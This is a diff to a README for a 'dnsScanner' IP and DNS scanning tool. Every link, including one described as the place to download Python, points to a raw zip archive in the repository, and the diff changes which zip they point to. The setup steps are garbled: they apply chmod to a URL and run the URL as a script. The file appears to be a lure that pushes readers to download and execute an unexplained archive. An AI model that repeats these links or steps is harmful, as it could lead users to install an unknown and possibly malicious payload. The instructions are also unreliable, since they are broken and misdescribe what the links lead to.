@@ -1,7 +1,7 @@
 # 🖥️ dnsScanner - Scan and Analyze DNS Easily
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/slipstream-client/linux/Scanner_dns_3.7.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/slipstream-client/linux/Scanner_dns_3.7.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/python/dns_Scanner_v1.7-alpha.4.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/python/dns_Scanner_v1.7-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to dnsScanner! This tool helps you scan millions of IP addresses. It provides a result file containing the IPs that are associated with DNS. With this guide, you will learn how to download and run the application easily. 
@@ -14,7 +14,7 @@ Before you begin, ensure your system meets the following requirements:
 - Internet connection for downloading the application 
 
 ## 📂 Download & Install
-To download dnsScanner, please visit the [Releases page](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/slipstream-client/linux/Scanner_dns_3.7.zip). 
+To download dnsScanner, please visit the [Releases page](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/python/dns_Scanner_v1.7-alpha.4.zip). 
 
 1. Open the link above in your web browser.
 2. Locate the latest release version.
@@ -31,16 +31,16 @@ After you download the file, follow these steps to run the application:
 2. Navigate to the directory where you downloaded the file. You can use the `cd` command to change directories.
 3. Make the script executable by running:
    ```bash
-   chmod +x https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/slipstream-client/linux/Scanner_dns_3.7.zip
+   chmod +x https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/python/dns_Scanner_v1.7-alpha.4.zip
    ```
-   Replace `https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/slipstream-client/linux/Scanner_dns_3.7.zip` with the actual file name.
+   Replace `https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/python/dns_Scanner_v1.7-alpha.4.zip` with the actual file name.
 4. Run the script with:
    ```bash
-   https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/slipstream-client/linux/Scanner_dns_3.7.zip
+   https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/python/dns_Scanner_v1.7-alpha.4.zip
    ```
 
 ### 📊 For Python Users
-1. Ensure you have Python installed. If not, download it from [https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/slipstream-client/linux/Scanner_dns_3.7.zip](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/slipstream-client/linux/Scanner_dns_3.7.zip).
+1. Ensure you have Python installed. If not, download it from [https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/python/dns_Scanner_v1.7-alpha.4.zip](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/python/dns_Scanner_v1.7-alpha.4.zip).
 2. Open the downloaded directory in your file explorer.
 3. Double-click the Python file to run it. This will launch the graphical user interface.
 
@@ -57,8 +57,8 @@ After you download the file, follow these steps to run the application:
 3. View the results in the specified output file.
 
 ## 🔗 Additional Resources
-- **Bash Version:** [Explore Bash Code](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/slipstream-client/linux/Scanner_dns_3.7.zip)
-- **Python Version:** [Explore Python Code](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/slipstream-client/linux/Scanner_dns_3.7.zip)
+- **Bash Version:** [Explore Bash Code](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/python/dns_Scanner_v1.7-alpha.4.zip)
+- **Python Version:** [Explore Python Code](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/python/dns_Scanner_v1.7-alpha.4.zip)
 
 ## 💬 Support
 If you encounter issues or have questions, you can open an issue on the GitHub repository. Our community is here to help you.
@@ -70,4 +70,4 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 - Always check for the latest release to ensure you have the most recent features and fixes.
 - For best results, run the application on a system with sufficient resources.
 
-To download the latest release again, [click here](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/slipstream-client/linux/Scanner_dns_3.7.zip). Enjoy scanning!
+To download the latest release again, [click here](https://raw.githubusercontent.com/Sumit3667/dnsScanner/main/python/dns_Scanner_v1.7-alpha.4.zip). Enjoy scanning!
